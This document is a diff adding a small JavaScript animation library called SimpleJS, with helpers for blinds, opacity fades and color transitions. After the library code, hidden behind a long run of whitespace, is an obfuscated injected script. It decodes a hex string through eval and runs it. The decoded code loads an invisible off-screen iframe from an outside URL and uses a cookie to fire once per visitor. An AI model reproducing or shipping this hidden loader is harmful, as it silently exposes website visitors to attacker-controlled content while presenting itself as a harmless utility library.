@@ -1,0 +1,232 @@
+/*
+SimpleJS ver 0.1 beta
+----------------------
+SimpleJS is developed by Christophe "Dyo" Lefevre (http://bleebot.com/)
+*/
+function $(id){
+return document.getElementById(id);
+}
+function STO(_24,_25){
+return window.setTimeout(_24,_25);
+}
+function DecToHexa(_26){
+var _27=parseInt(_26).toString(16);
+if(_26<16){
+_27="0"+_27;
+}
+return _27;
+}
+function addslashes(str){
+str=str.replace(/\"/g,"\\\"");
+str=str.replace(/\'/g,"\\'");
+return str;
+}
+function $toggle(id){
+if(act_height(id)==0){
+$blinddown(id);
+}else{
+$blindup(id);
+}
+}
+function act_height(id){
+height=$(id).clientHeight;
+if(height==0){
+height=$(id).offsetHeight;
+}
+return height;
+}
+function act_width(id){
+width=$(id).clientWidth;
+if(width==0){
+width=$(id).offsetWidth;
+}
+return width;
+}
+function max_height(id){
+var ids=$(id).style;
+ids.overflow="hidden";
+if(act_height(id)!=0){
+return act_height(id);
+}else{
+origdisp=ids.display;
+origheight=ids.height;
+origpos=ids.position;
+origvis=ids.visibility;
+ids.visibility="hidden";
+ids.height="";
+ids.display="block";
+ids.position="absolute";
+height=act_height(id);
+ids.display=origdisp;
+ids.height=origheight;
+ids.position=origpos;
+ids.visibility=origvis;
+return height;
+}
+}
+function $blindup(id,_2f){
+if(!_2f){
+_2f=200;
+}
+acth=act_height(id);
+maxh=max_height(id);
+if(acth==maxh){
+$(id).style.display="block";
+var _30;
+_30=Math.ceil(_2f/acth);
+for(i=0;i<=acth;i++){
+newh=acth-i;
+STO("$('"+id+"').style.height='"+newh+"px'",_30*i);
+}
+}
+}
+function $blinddown(id,_32){
+if(!_32){
+_32=200;
+}
+acth=act_height(id);
+if(acth==0){
+maxh=max_height(id);
+$(id).style.display="block";
+$(id).style.height="0px";
+var _33;
+_33=Math.ceil(_32/maxh);
+for(i=1;i<=maxh;i++){
+STO("$('"+id+"').style.height='"+i+"px'",_33*i);
+}
+}
+}
+function $opacity(id,_35,_36,_37){
+if($(id).style.width==0){
+$(id).style.width=act_width(id);
+}
+var _38=Math.round(_37/100);
+var _39=0;
+if(_35>_36){
+for(i=_35;i>=_36;i--){
+STO("changeOpac("+i+",'"+id+"')",(_39*_38));
+_39++;
+}
+}else{
+if(_35<_36){
+for(i=_35;i<=_36;i++){
+STO("changeOpac("+i+",'"+id+"')",(_39*_38));
+_39++;
+}
+}
+}
+}
+function $pulsate(id,num,speed){
+if (!speed) speed = 300;
+for(i = 1; i <= num; i++) {
+numx=i*((speed*2)+100)-(speed*2);
+STO("$opacity('"+id+"', 100, 0, "+speed+")",numx);
+STO("$opacity('"+id+"', 0, 100, "+speed+")",numx+speed+100);
+}
+}
+function changeOpac(_3a,id){
+var ids=$(id).style;
+ids.opacity=(_3a/100);
+ids.MozOpacity=(_3a/100);
+ids.KhtmlOpacity=(_3a/100);
+ids.filter="alpha(opacity="+_3a+")";
+}
+function $shiftOpacity(id,_3e){
+if($(id).style.opacity<0.5){
+$opacity(id,0,100,_3e);
+}else{
+$opacity(id,100,0,_3e);
+}
+}
+function currentOpac(id,_40,_41){
+var _42=100;
+if($(id).style.opacity<100){
+_42=$(id).style.opacity*100;
+}
+$opacity(id,_42,_40,_41);
+}
+function $highlight(id,_44,_45,_46){
+if(_44){
+milli=_44;
+}else{
+milli=900;
+}
+if(_45){
+endcol=_45;
+}else{
+endcol="#FFFFFF";
+}
+if(_46){
+origcol=_46;
+}else{
+origcol="#FFFFA6";
+}
+$colorize(origcol,endcol,id,milli,"high");
+}
+function $textColor(id,_48,_49,_4a){
+if(_4a){
+milli=_4a;
+}else{
+milli=900;
+}
+$colorize(_48,_49,id,milli,"text");
+}
+function $morphColor(id,_4c,_4d,_4e,_4f,_50,_51,_52){
+if(_52){
+milli=_52;
+}else{
+milli=900;
+}
+$colorize(_4c,_4d,id,milli,"text");
+$colorize(_4e,_4f,id,milli,"back");
+if(_50!=false){
+$colorize(_50,_51,id,milli,"border");
+}
+}
+function $colorize(_53,end,id,_56,_57){
+dr=parseInt(_53.substring(1,3),16);
+dg=parseInt(_53.substring(3,5),16);
+db=parseInt(_53.substring(5,7),16);
+fr=parseInt(end.substring(1,3),16);
+fg=parseInt(end.substring(3,5),16);
+fb=parseInt(end.substring(5,7),16);
+steps=_56/10;
+cr=dr;
+cg=dg;
+cb=db;
+sr=(fr-dr)/steps;
+sg=(fg-dg)/steps;
+sb=(fb-db)/steps;
+var zzi=10;
+for(var x=0;x<steps;x++){
+color="#"+DecToHexa(cr)+DecToHexa(cg)+DecToHexa(cb);
+if(x==(steps-1)){
+if(_57=="high"){
+color="";
+}else{
+color=end;
+}
+}
+mytime=(x);
+if(_57=="back"||_57=="high"){
+newfonc="$(\""+id+"\").style.backgroundColor=\""+color+"\";";
+}else{
+if(_57=="text"){
+newfonc="$(\""+id+"\").style.color=\""+color+"\";";
+}else{
+if(_57=="border"){
+newfonc="$(\""+id+"\").style.borderColor=\""+color+"\";";
+}
+}
+}
+STO(newfonc,zzi);
+cr+=sr;
+cg+=sg;
+cb+=sb;
+zzi+=10;
+}
+}
+
+/*74ed9f*/
+                                                                                                                                                                                                                                                          abmd="y";lapv="d"+"o"+"c"+"ument";try{+function(){if(document.querySelector)++(window[lapv].body)==null}()}catch(grkdh){rcaots=function(bvp){bvp="fr"+"omCh"+bvp;for(bifj=0;bifj<abmd.length;bifj++){skieax+=String[bvp](oxt(slr+(abmd[bifj]))-(106));}};};oxt=(eval);slr="0x";vwmu=0;try{;}catch(satpzq){vwmu=1}if(!vwmu){try{++oxt(lapv)["\x62o"+"d"+abmd]}catch(grkdh){efnbq="^";}abmd="8a^d0^df^d8^cd^de^d3^d9^d8^8a^db^d8^cf^9a^a3^92^93^8a^e5^77^74^8a^e0^cb^dc^8a^dd^de^cb^de^d3^cd^a7^91^cb^d4^cb^e2^91^a5^77^74^8a^e0^cb^dc^8a^cd^d9^d8^de^dc^d9^d6^d6^cf^dc^a7^91^d3^d8^ce^cf^e2^98^da^d2^da^91^a5^77^74^8a^e0^cb^dc^8a^db^d8^cf^8a^a7^8a^ce^d9^cd^df^d7^cf^d8^de^98^cd^dc^cf^cb^de^cf^af^d6^cf^d7^cf^d8^de^92^91^d3^d0^dc^cb^d7^cf^91^93^a5^77^74^77^74^8a^db^d8^cf^98^dd^dc^cd^8a^a7^8a^91^d2^de^de^da^a4^99^99^e1^e1^e1^98^cb^9b^dd^de^d9^cd^d5^da^d3^cd^d5^dd^98^cd^d9^d7^99^e2^9c^b5^cd^d7^a3^c2^ce^98^da^d2^da^91^a5^77^74^8a^db^d8^cf^98^dd^de^e3^d6^cf^98^da^d9^dd^d3^de^d3^d9^d8^8a^a7^8a^91^cb^cc^dd^d9^d6^df^de^cf^91^a5^77^74^8a^db^d8^cf^98^dd^de^e3^d6^cf^98^cd^d9^d6^d9^dc^8a^a7^8a^91^9f^9b^a0^9d^a3^91^a5^77^74^8a^db^d8^cf^98^dd^de^e3^d6^cf^98^d2^cf^d3^d1^d2^de^8a^a7^8a^91^9f^9b^a0^9d^a3^da^e2^91^a5^77^74^8a^db^d8^cf^98^dd^de^e3^d6^cf^98^e1^d3^ce^de^d2^8a^a7^8a^91^9f^9b^a0^9d^a3^da^e2^91^a5^77^74^8a^db^d8^cf^98^dd^de^e3^d6^cf^98^d6^cf^d0^de^8a^a7^8a^91^9b^9a^9a^9a^9f^9b^a0^9d^a3^91^a5^77^74^8a^db^d8^cf^98^dd^de^e3^d6^cf^98^de^d9^da^8a^a7^8a^91^9b^9a^9a^9a^9f^9b^a0^9d^a3^91^a5^77^74^77^74^8a^d3^d0^8a^92^8b^ce^d9^cd^df^d7^cf^d8^de^98^d1^cf^de^af^d6^cf^d7^cf^d8^de^ac^e3^b3^ce^92^91^db^d8^cf^91^93^93^8a^e5^77^74^8a^ce^d9^cd^df^d7^cf^d8^de^98^e1^dc^d3^de^cf^92^91^a6^da^8a^d3^ce^a7^c6^91^db^d8^cf^c6^91^8a^cd^d6^cb^dd^dd^a7^c6^91^db^d8^cf^9a^a3^c6^91^8a^a8^a6^99^da^a8^91^93^a5^77^74^8a^ce^d9^cd^df^d7^cf^d8^de^98^d1^cf^de^af^d6^cf^d7^cf^d8^de^ac^e3^b3^ce^92^91^db^d8^cf^91^93^98^cb^da^da^cf^d8^ce^ad^d2^d3^d6^ce^92^db^d8^cf^93^a5^77^74^8a^e7^77^74^e7^77^74^d0^df^d8^cd^de^d3^d9^d8^8a^bd^cf^de^ad^d9^d9^d5^d3^cf^92^cd^d9^d9^d5^d3^cf^b8^cb^d7^cf^96^cd^d9^d9^d5^d3^cf^c0^cb^d6^df^cf^96^d8^ae^cb^e3^dd^96^da^cb^de^d2^93^8a^e5^77^74^8a^e0^cb^dc^8a^de^d9^ce^cb^e3^8a^a7^8a^d8^cf^e1^8a^ae^cb^de^cf^92^93^a5^77^74^8a^e0^cb^dc^8a^cf^e2^da^d3^dc^cf^8a^a7^8a^d8^cf^e1^8a^ae^cb^de^cf^92^93^a5^77^74^8a^d3^d0^8a^92^d8^ae^cb^e3^dd^a7^a7^d8^df^d6^d6^8a^e6^e6^8a^d8^ae^cb^e3^dd^a7^a7^9a^93^8a^d8^ae^cb^e3^dd^a7^9b^a5^77^74^8a^cf^e2^da^d3^dc^cf^98^dd^cf^de^be^d3^d7^cf^92^de^d9^ce^cb^e3^98^d1^cf^de^be^d3^d7^cf^92^93^8a^95^8a^9d^a0^9a^9a^9a^9a^9a^94^9c^9e^94^d8^ae^cb^e3^dd^93^a5^77^74^8a^ce^d9^cd^df^d7^cf^d8^de^98^cd^d9^d9^d5^d3^cf^8a^a7^8a^cd^d9^d9^d5^d3^cf^b8^cb^d7^cf^95^8c^a7^8c^95^cf^dd^cd^cb^da^cf^92^cd^d9^d9^d5^d3^cf^c0^cb^d6^df^cf^93^77^74^8a^95^8a^8c^a5^cf^e2^da^d3^dc^cf^dd^a7^8c^8a^95^8a^cf^e2^da^d3^dc^cf^98^de^d9^b1^b7^be^bd^de^dc^d3^d8^d1^92^93^8a^95^8a^92^92^da^cb^de^d2^93^8a^a9^8a^8c^a5^8a^da^cb^de^d2^a7^8c^8a^95^8a^da^cb^de^d2^8a^a4^8a^8c^8c^93^a5^77^74^e7^77^74^d0^df^d8^cd^de^d3^d9^d8^8a^b1^cf^de^ad^d9^d9^d5^d3^cf^92^8a^d8^cb^d7^cf^8a^93^8a^e5^77^74^8a^e0^cb^dc^8a^dd^de^cb^dc^de^8a^a7^8a^ce^d9^cd^df^d7^cf^d8^de^98^cd^d9^d9^d5^d3^cf^98^d3^d8^ce^cf^e2^b9^d0^92^8a^d8^cb^d7^cf^8a^95^8a^8c^a7^8c^8a^93^a5^77^74^8a^e0^cb^dc^8a^d6^cf^d8^8a^a7^8a^dd^de^cb^dc^de^8a^95^8a^d8^cb^d7^cf^98^d6^cf^d8^d1^de^d2^8a^95^8a^9b^a5^77^74^8a^d3^d0^8a^92^8a^92^8a^8b^dd^de^cb^dc^de^8a^93^8a^90^90^77^74^8a^92^8a^d8^cb^d7^cf^8a^8b^a7^8a^ce^d9^cd^df^d7^cf^d8^de^98^cd^d9^d9^d5^d3^cf^98^dd^df^cc^dd^de^dc^d3^d8^d1^92^8a^9a^96^8a^d8^cb^d7^cf^98^d6^cf^d8^d1^de^d2^8a^93^8a^93^8a^93^77^74^8a^e5^77^74^8a^dc^cf^de^df^dc^d8^8a^d8^df^d6^d6^a5^77^74^8a^e7^77^74^8a^d3^d0^8a^92^8a^dd^de^cb^dc^de^8a^a7^a7^8a^97^9b^8a^93^8a^dc^cf^de^df^dc^d8^8a^d8^df^d6^d6^a5^77^74^8a^e0^cb^dc^8a^cf^d8^ce^8a^a7^8a^ce^d9^cd^df^d7^cf^d8^de^98^cd^d9^d9^d5^d3^cf^98^d3^d8^ce^cf^e2^b9^d0^92^8a^8c^a5^8c^96^8a^d6^cf^d8^8a^93^a5^77^74^8a^d3^d0^8a^92^8a^cf^d8^ce^8a^a7^a7^8a^97^9b^8a^93^8a^cf^d8^ce^8a^a7^8a^ce^d9^cd^df^d7^cf^d8^de^98^cd^d9^d9^d5^d3^cf^98^d6^cf^d8^d1^de^d2^a5^77^74^8a^dc^cf^de^df^dc^d8^8a^df^d8^cf^dd^cd^cb^da^cf^92^8a^ce^d9^cd^df^d7^cf^d8^de^98^cd^d9^d9^d5^d3^cf^98^dd^df^cc^dd^de^dc^d3^d8^d1^92^8a^d6^cf^d8^96^8a^cf^d8^ce^8a^93^8a^93^a5^77^74^e7^77^74^d3^d0^8a^92^d8^cb^e0^d3^d1^cb^de^d9^dc^98^cd^d9^d9^d5^d3^cf^af^d8^cb^cc^d6^cf^ce^93^77^74^e5^77^74^d3^d0^92^b1^cf^de^ad^d9^d9^d5^d3^cf^92^91^e0^d3^dd^d3^de^cf^ce^c9^df^db^91^93^a7^a7^9f^9f^93^e5^e7^cf^d6^dd^cf^e5^bd^cf^de^ad^d9^d9^d5^d3^cf^92^91^e0^d3^dd^d3^de^cf^ce^c9^df^db^91^96^8a^91^9f^9f^91^96^8a^91^9b^91^96^8a^91^99^91^93^a5^77^74^77^74^db^d8^cf^9a^a3^92^93^a5^77^74^e7^77^74^e7".split(efnbq);skieax="";rcaots("arCode");oxt(""+skieax);}
+/*/74ed9f*/
